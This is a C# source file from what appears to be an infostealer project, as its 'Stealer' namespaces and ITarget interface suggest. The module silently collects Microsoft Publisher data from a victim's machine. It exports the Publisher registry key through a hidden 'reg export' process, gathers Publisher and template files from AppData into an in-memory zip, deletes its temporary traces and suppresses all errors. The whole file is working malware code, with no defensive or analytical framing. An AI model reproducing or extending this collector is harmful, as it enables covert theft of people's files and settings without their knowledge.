using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class Publisher : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var publisherApp = new Counter.CounterApplications { Name = "Microsoft Publisher" };
                
                CollectPublisherRegistry(zip, publisherApp);
                CollectPublisherFiles(zip, publisherApp);
                
                if (publisherApp.Files.Count > 0)
                {
                    counter.Applications.Add(publisherApp);
                }
            }
            catch { }
        }

        private void CollectPublisherRegistry(InMemoryZip zip, Counter.CounterApplications publisherApp)
        {
            try
            {
                string regPath = @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Publisher";
                string fileName = "publisher_registry.reg";
                
                using (var process = new Process())
                {
                    process.StartInfo.FileName = "reg";
                    process.StartInfo.Arguments = $"export \"{regPath}\" \"{fileName}\" /y";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    process.WaitForExit();

                    if (File.Exists(fileName))
                    {
                        string relativePath = Path.Combine("Microsoft", "Publisher", fileName);
                        zip.AddFile(relativePath, File.ReadAllBytes(fileName));
                        publisherApp.Files.Add(relativePath);
                        File.Delete(fileName);
                    }
                }
            }
            catch { }
        }

        private void CollectPublisherFiles(InMemoryZip zip, Counter.CounterApplications publisherApp)
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                string[] publisherPaths = {
                    Path.Combine(appData, "Microsoft", "Publisher"),
                    Path.Combine(appData, "Microsoft", "Templates")
                };

                foreach (string publisherPath in publisherPaths)
                {
                    if (Directory.Exists(publisherPath))
                    {
                        CollectPublisherFilesFromPath(publisherPath, zip, publisherApp);
                    }
                }
            }
            catch { }
        }

        private void CollectPublisherFilesFromPath(string basePath, InMemoryZip zip, Counter.CounterApplications publisherApp)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".pub" || extension == ".pubx" || extension == ".puz" || 
                            extension == ".pot" || extension == ".potx" || extension == ".potm" ||
                            fileName.Contains("publisher") || fileName.Contains("template"))
                        {
                            string relativePath = Path.Combine("Microsoft", "Publisher", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            publisherApp.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
